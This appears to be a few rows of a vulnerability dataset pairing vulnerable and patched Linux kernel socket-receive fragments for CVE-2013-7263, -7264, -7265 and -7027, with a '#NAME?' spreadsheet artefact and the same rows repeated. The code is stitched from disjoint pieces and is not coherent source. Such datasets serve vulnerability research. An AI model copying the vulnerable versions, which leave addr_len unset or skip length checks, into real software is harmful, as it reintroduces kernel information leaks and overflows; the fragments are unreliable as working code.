 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_name) {

		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);
 struct sockaddr_ax25 *sax = msg->msg_name;

 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN)

 return 0;

 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);


	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;



 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);

 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;


 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;



	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;



 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
 if (kern_msg->msg_name)
			kern_msg->msg_name = kern_address;
	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
 if (m->msg_name)
			m->msg_name = address;
	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;



 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;
		msg->msg_namelen	= sizeof(*sipx);
	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);



	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);



 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;



 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;


	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;



	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;



 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif



	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);
		msg->msg_namelen = sizeof(*sax);
	}



 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);



 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;

 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /* You lose any data beyond the buffer you gave. If it worries
	 * a user program they can ask the device for its MTU
	 * anyway.











 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name) {
 /* If the address length field is there to be filled
		 * in, we fill it in now.
 */
 if (sock->type == SOCK_PACKET) {
			msg->msg_namelen = sizeof(struct sockaddr_pkt);
		} else {
 struct sockaddr_ll *sll = &PACKET_SKB_CB(skb)->sa.ll;
			msg->msg_namelen = sll->sll_halen +
 offsetof(struct sockaddr_ll, sll_addr);
		}
 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);
	}

 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);



 if (msg_flags & MSG_OOB)
 goto out;

"
2014,#NAME?,CVE-2013-7265," if (saddr) {
		saddr->family = AF_IEEE802154;
		saddr->addr = mac_cb(skb)->sa;
	}
 if (addr_len)
		*addr_len = sizeof(*saddr);


 if (flags & MSG_TRUNC)
		copied = skb->len;
{
 struct inet_sock *isk = inet_sk(sk);
 int family = sk->sk_family;
 struct sockaddr_in *sin;
 struct sockaddr_in6 *sin6;
 struct sk_buff *skb;
 int copied, err;

 if (flags & MSG_OOB)
 goto out;

 if (addr_len) {
 if (family == AF_INET)
			*addr_len = sizeof(*sin);
 else if (family == AF_INET6 && addr_len)
			*addr_len = sizeof(*sin6);
	}

 if (flags & MSG_ERRQUEUE) {
 if (family == AF_INET) {
 return ip_recv_error(sk, msg, len);

 /* Copy the address and add cmsg data. */
 if (family == AF_INET) {
 sin = (struct sockaddr_in *) msg->msg_name;

 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));


 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
	} else if (family == AF_INET6) {
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct ipv6hdr *ip6 = ipv6_hdr(skb);
		sin6 = (struct sockaddr_in6 *) msg->msg_name;


		sin6->sin6_family = AF_INET6;
		sin6->sin6_port = 0;
		sin6->sin6_addr = ip6->saddr;

		sin6->sin6_flowinfo = 0;
 if (np->sndflow)
			sin6->sin6_flowinfo = ip6_flowinfo(ip6);

		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);


 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
 if (flags & MSG_OOB)
 goto out;

 if (addr_len)
		*addr_len = sizeof(*sin);

 if (flags & MSG_ERRQUEUE) {
		err = ip_recv_error(sk, msg, len);
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 int is_udplite = IS_UDPLITE(sk);
 bool slow;

 /*
	 *	Check any passed addresses
 */
 if (addr_len)
		*addr_len = sizeof(*sin);

 if (flags & MSG_ERRQUEUE)
 return ip_recv_error(sk, msg, len);

 sin->sin_port = udp_hdr(skb)->source;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

 if (addr_len)
		*addr_len=sizeof(*sin6);

 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

		sin6->sin6_flowinfo = 0;
		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);

	}

 sock_recv_ts_and_drops(msg, sk, skb);
 int is_udp4;
 bool slow;

 if (addr_len)
		*addr_len = sizeof(struct sockaddr_in6);

 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

 ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		}

	}
 if (is_udp4) {
 if (inet->cmsg_flags)
 if (flags & MSG_OOB)
 goto out;

 if (addr_len)
		*addr_len = sizeof(*sin);

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb)
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
			MSG_CMSG_COMPAT))
 goto out_nofree;

 if (addr_len)
		*addr_len = sizeof(sa);

	skb = skb_recv_datagram(sk, flags, noblock, &rval);
 if (skb == NULL)
 goto out_nofree;

	rval = (flags & MSG_TRUNC) ? skb->len : copylen;

 if (msg->msg_name != NULL)
 memcpy(msg->msg_name, &sa, sizeof(struct sockaddr_pn));



out:
 skb_free_datagram(sk, skb);
"," if (saddr) {
		saddr->family = AF_IEEE802154;
		saddr->addr = mac_cb(skb)->sa;


		*addr_len = sizeof(*saddr);
	}

 if (flags & MSG_TRUNC)
		copied = skb->len;
{
 struct inet_sock *isk = inet_sk(sk);
 int family = sk->sk_family;


 struct sk_buff *skb;
 int copied, err;

 if (flags & MSG_OOB)
 goto out;








 if (flags & MSG_ERRQUEUE) {
 if (family == AF_INET) {
 return ip_recv_error(sk, msg, len);

 /* Copy the address and add cmsg data. */
 if (family == AF_INET) {
 struct sockaddr_in *sin = (struct sockaddr_in *)msg->msg_name;

 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);

 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
	} else if (family == AF_INET6) {
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct ipv6hdr *ip6 = ipv6_hdr(skb);
 struct sockaddr_in6 *sin6 =
			(struct sockaddr_in6 *)msg->msg_name;

		sin6->sin6_family = AF_INET6;
		sin6->sin6_port = 0;
		sin6->sin6_addr = ip6->saddr;

		sin6->sin6_flowinfo = 0;
 if (np->sndflow)
			sin6->sin6_flowinfo = ip6_flowinfo(ip6);

		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		*addr_len = sizeof(*sin6);

 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
 if (flags & MSG_OOB)
 goto out;




 if (flags & MSG_ERRQUEUE) {
		err = ip_recv_error(sk, msg, len);
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 int is_udplite = IS_UDPLITE(sk);
 bool slow;







 if (flags & MSG_ERRQUEUE)
 return ip_recv_error(sk, msg, len);

 sin->sin_port = udp_hdr(skb)->source;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;




 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

		sin6->sin6_flowinfo = 0;
		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		*addr_len = sizeof(*sin6);
	}

 sock_recv_ts_and_drops(msg, sk, skb);
 int is_udp4;
 bool slow;




 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

 ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		}
		*addr_len = sizeof(*sin6);
	}
 if (is_udp4) {
 if (inet->cmsg_flags)
 if (flags & MSG_OOB)
 goto out;




	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb)
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
			MSG_CMSG_COMPAT))
 goto out_nofree;




	skb = skb_recv_datagram(sk, flags, noblock, &rval);
 if (skb == NULL)
 goto out_nofree;

	rval = (flags & MSG_TRUNC) ? skb->len : copylen;

 if (msg->msg_name != NULL) {
 memcpy(msg->msg_name, &sa, sizeof(sa));
		*addr_len = sizeof(sa);
	}

out:
 skb_free_datagram(sk, skb);
"
2014,#NAME?,CVE-2013-7264," if (saddr) {
		saddr->family = AF_IEEE802154;
		saddr->addr = mac_cb(skb)->sa;
	}
 if (addr_len)
		*addr_len = sizeof(*saddr);


 if (flags & MSG_TRUNC)
		copied = skb->len;
{
 struct inet_sock *isk = inet_sk(sk);
 int family = sk->sk_family;
 struct sockaddr_in *sin;
 struct sockaddr_in6 *sin6;
 struct sk_buff *skb;
 int copied, err;

 if (flags & MSG_OOB)
 goto out;

 if (addr_len) {
 if (family == AF_INET)
			*addr_len = sizeof(*sin);
 else if (family == AF_INET6 && addr_len)
			*addr_len = sizeof(*sin6);
	}

 if (flags & MSG_ERRQUEUE) {
 if (family == AF_INET) {
 return ip_recv_error(sk, msg, len);

 /* Copy the address and add cmsg data. */
 if (family == AF_INET) {
 sin = (struct sockaddr_in *) msg->msg_name;

 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));


 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
	} else if (family == AF_INET6) {
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct ipv6hdr *ip6 = ipv6_hdr(skb);
		sin6 = (struct sockaddr_in6 *) msg->msg_name;


		sin6->sin6_family = AF_INET6;
		sin6->sin6_port = 0;
		sin6->sin6_addr = ip6->saddr;

		sin6->sin6_flowinfo = 0;
 if (np->sndflow)
			sin6->sin6_flowinfo = ip6_flowinfo(ip6);

		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);


 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
 if (flags & MSG_OOB)
 goto out;

 if (addr_len)
		*addr_len = sizeof(*sin);

 if (flags & MSG_ERRQUEUE) {
		err = ip_recv_error(sk, msg, len);
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 int is_udplite = IS_UDPLITE(sk);
 bool slow;

 /*
	 *	Check any passed addresses
 */
 if (addr_len)
		*addr_len = sizeof(*sin);

 if (flags & MSG_ERRQUEUE)
 return ip_recv_error(sk, msg, len);

 sin->sin_port = udp_hdr(skb)->source;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

 if (addr_len)
		*addr_len=sizeof(*sin6);

 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

		sin6->sin6_flowinfo = 0;
		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);

	}

 sock_recv_ts_and_drops(msg, sk, skb);
 int is_udp4;
 bool slow;

 if (addr_len)
		*addr_len = sizeof(struct sockaddr_in6);

 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

 ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		}

	}
 if (is_udp4) {
 if (inet->cmsg_flags)
 if (flags & MSG_OOB)
 goto out;

 if (addr_len)
		*addr_len = sizeof(*sin);

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb)
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
			MSG_CMSG_COMPAT))
 goto out_nofree;

 if (addr_len)
		*addr_len = sizeof(sa);

	skb = skb_recv_datagram(sk, flags, noblock, &rval);
 if (skb == NULL)
 goto out_nofree;

	rval = (flags & MSG_TRUNC) ? skb->len : copylen;

 if (msg->msg_name != NULL)
 memcpy(msg->msg_name, &sa, sizeof(struct sockaddr_pn));



out:
 skb_free_datagram(sk, skb);
"," if (saddr) {
		saddr->family = AF_IEEE802154;
		saddr->addr = mac_cb(skb)->sa;


		*addr_len = sizeof(*saddr);
	}

 if (flags & MSG_TRUNC)
		copied = skb->len;
{
 struct inet_sock *isk = inet_sk(sk);
 int family = sk->sk_family;


 struct sk_buff *skb;
 int copied, err;

 if (flags & MSG_OOB)
 goto out;








 if (flags & MSG_ERRQUEUE) {
 if (family == AF_INET) {
 return ip_recv_error(sk, msg, len);

 /* Copy the address and add cmsg data. */
 if (family == AF_INET) {
 struct sockaddr_in *sin = (struct sockaddr_in *)msg->msg_name;

 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);

 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
	} else if (family == AF_INET6) {
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct ipv6hdr *ip6 = ipv6_hdr(skb);
 struct sockaddr_in6 *sin6 =
			(struct sockaddr_in6 *)msg->msg_name;

		sin6->sin6_family = AF_INET6;
		sin6->sin6_port = 0;
		sin6->sin6_addr = ip6->saddr;

		sin6->sin6_flowinfo = 0;
 if (np->sndflow)
			sin6->sin6_flowinfo = ip6_flowinfo(ip6);

		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		*addr_len = sizeof(*sin6);

 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
 if (flags & MSG_OOB)
 goto out;




 if (flags & MSG_ERRQUEUE) {
		err = ip_recv_error(sk, msg, len);
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 int is_udplite = IS_UDPLITE(sk);
 bool slow;







 if (flags & MSG_ERRQUEUE)
 return ip_recv_error(sk, msg, len);

 sin->sin_port = udp_hdr(skb)->source;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;




 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

		sin6->sin6_flowinfo = 0;
		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		*addr_len = sizeof(*sin6);
	}

 sock_recv_ts_and_drops(msg, sk, skb);
 int is_udp4;
 bool slow;




 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

 ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		}
		*addr_len = sizeof(*sin6);
	}
 if (is_udp4) {
 if (inet->cmsg_flags)
 if (flags & MSG_OOB)
 goto out;




	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb)
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
			MSG_CMSG_COMPAT))
 goto out_nofree;




	skb = skb_recv_datagram(sk, flags, noblock, &rval);
 if (skb == NULL)
 goto out_nofree;

	rval = (flags & MSG_TRUNC) ? skb->len : copylen;

 if (msg->msg_name != NULL) {
 memcpy(msg->msg_name, &sa, sizeof(sa));
		*addr_len = sizeof(sa);
	}

out:
 skb_free_datagram(sk, skb);
"
2014,#NAME?,CVE-2013-7263," if (saddr) {
		saddr->family = AF_IEEE802154;
		saddr->addr = mac_cb(skb)->sa;
	}
 if (addr_len)
		*addr_len = sizeof(*saddr);


 if (flags & MSG_TRUNC)
		copied = skb->len;
{
 struct inet_sock *isk = inet_sk(sk);
 int family = sk->sk_family;
 struct sockaddr_in *sin;
 struct sockaddr_in6 *sin6;
 struct sk_buff *skb;
 int copied, err;

 if (flags & MSG_OOB)
 goto out;

 if (addr_len) {
 if (family == AF_INET)
			*addr_len = sizeof(*sin);
 else if (family == AF_INET6 && addr_len)
			*addr_len = sizeof(*sin6);
	}

 if (flags & MSG_ERRQUEUE) {
 if (family == AF_INET) {
 return ip_recv_error(sk, msg, len);

 /* Copy the address and add cmsg data. */
 if (family == AF_INET) {
 sin = (struct sockaddr_in *) msg->msg_name;

 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));


 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
	} else if (family == AF_INET6) {
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct ipv6hdr *ip6 = ipv6_hdr(skb);
		sin6 = (struct sockaddr_in6 *) msg->msg_name;


		sin6->sin6_family = AF_INET6;
		sin6->sin6_port = 0;
		sin6->sin6_addr = ip6->saddr;

		sin6->sin6_flowinfo = 0;
 if (np->sndflow)
			sin6->sin6_flowinfo = ip6_flowinfo(ip6);

		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);


 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
 if (flags & MSG_OOB)
 goto out;

 if (addr_len)
		*addr_len = sizeof(*sin);

 if (flags & MSG_ERRQUEUE) {
		err = ip_recv_error(sk, msg, len);
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 int is_udplite = IS_UDPLITE(sk);
 bool slow;

 /*
	 *	Check any passed addresses
 */
 if (addr_len)
		*addr_len = sizeof(*sin);

 if (flags & MSG_ERRQUEUE)
 return ip_recv_error(sk, msg, len);

 sin->sin_port = udp_hdr(skb)->source;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

 if (addr_len)
		*addr_len=sizeof(*sin6);

 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

		sin6->sin6_flowinfo = 0;
		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);

	}

 sock_recv_ts_and_drops(msg, sk, skb);
 int is_udp4;
 bool slow;

 if (addr_len)
		*addr_len = sizeof(struct sockaddr_in6);

 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

 ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		}

	}
 if (is_udp4) {
 if (inet->cmsg_flags)
 if (flags & MSG_OOB)
 goto out;

 if (addr_len)
		*addr_len = sizeof(*sin);

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb)
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));

	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
			MSG_CMSG_COMPAT))
 goto out_nofree;

 if (addr_len)
		*addr_len = sizeof(sa);

	skb = skb_recv_datagram(sk, flags, noblock, &rval);
 if (skb == NULL)
 goto out_nofree;

	rval = (flags & MSG_TRUNC) ? skb->len : copylen;

 if (msg->msg_name != NULL)
 memcpy(msg->msg_name, &sa, sizeof(struct sockaddr_pn));



out:
 skb_free_datagram(sk, skb);
"," if (saddr) {
		saddr->family = AF_IEEE802154;
		saddr->addr = mac_cb(skb)->sa;


		*addr_len = sizeof(*saddr);
	}

 if (flags & MSG_TRUNC)
		copied = skb->len;
{
 struct inet_sock *isk = inet_sk(sk);
 int family = sk->sk_family;


 struct sk_buff *skb;
 int copied, err;

 if (flags & MSG_OOB)
 goto out;








 if (flags & MSG_ERRQUEUE) {
 if (family == AF_INET) {
 return ip_recv_error(sk, msg, len);

 /* Copy the address and add cmsg data. */
 if (family == AF_INET) {
 struct sockaddr_in *sin = (struct sockaddr_in *)msg->msg_name;

 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);

 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
	} else if (family == AF_INET6) {
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct ipv6hdr *ip6 = ipv6_hdr(skb);
 struct sockaddr_in6 *sin6 =
			(struct sockaddr_in6 *)msg->msg_name;

		sin6->sin6_family = AF_INET6;
		sin6->sin6_port = 0;
		sin6->sin6_addr = ip6->saddr;

		sin6->sin6_flowinfo = 0;
 if (np->sndflow)
			sin6->sin6_flowinfo = ip6_flowinfo(ip6);

		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		*addr_len = sizeof(*sin6);

 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
 if (flags & MSG_OOB)
 goto out;




 if (flags & MSG_ERRQUEUE) {
		err = ip_recv_error(sk, msg, len);
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 int is_udplite = IS_UDPLITE(sk);
 bool slow;







 if (flags & MSG_ERRQUEUE)
 return ip_recv_error(sk, msg, len);

 sin->sin_port = udp_hdr(skb)->source;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;




 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

		sin6->sin6_flowinfo = 0;
		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		*addr_len = sizeof(*sin6);
	}

 sock_recv_ts_and_drops(msg, sk, skb);
 int is_udp4;
 bool slow;




 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

 ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		}
		*addr_len = sizeof(*sin6);
	}
 if (is_udp4) {
 if (inet->cmsg_flags)
 if (flags & MSG_OOB)
 goto out;




	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb)
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
			MSG_CMSG_COMPAT))
 goto out_nofree;




	skb = skb_recv_datagram(sk, flags, noblock, &rval);
 if (skb == NULL)
 goto out_nofree;

	rval = (flags & MSG_TRUNC) ? skb->len : copylen;

 if (msg->msg_name != NULL) {
 memcpy(msg->msg_name, &sa, sizeof(sa));
		*addr_len = sizeof(sa);
	}

out:
 skb_free_datagram(sk, skb);
"
2013,DoS Overflow ,CVE-2013-7027," struct ieee80211_radiotap_header *radiotap_header,
 int max_length, const struct ieee80211_radiotap_vendor_namespaces *vns)
{




 /* Linux only supports version 0 radiotap format */
 if (radiotap_header->it_version)
 return -EINVAL;
 */

 if ((unsigned long)iterator->_arg -
			    (unsigned long)iterator->_rtheader >

			    (unsigned long)iterator->_max_length)
 return -EINVAL;
		}
"," struct ieee80211_radiotap_header *radiotap_header,
 int max_length, const struct ieee80211_radiotap_vendor_namespaces *vns)
{
 /* check the radiotap header can actually be present */
 if (max_length < sizeof(struct ieee80211_radiotap_header))
 return -EINVAL;

